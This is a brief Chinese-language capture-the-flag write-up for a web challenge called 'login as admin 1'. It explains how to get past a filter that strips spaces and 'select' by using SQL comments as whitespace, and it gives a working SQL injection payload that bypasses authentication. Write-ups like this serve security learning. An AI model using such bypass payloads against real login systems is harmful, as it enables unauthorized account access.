# inndy web login as admin 1
* [題目](https://hackme.inndy.tw/login1/)
1. 過濾掉空白字元和 select，但是工程師手殘所以把在 select 後面多了一個空白
2. 把多行註解當成空白字元就可以輕易繞過
```
輸入:
\'/**/OR/**/2=2/**/LIMIT/**/1,1#
```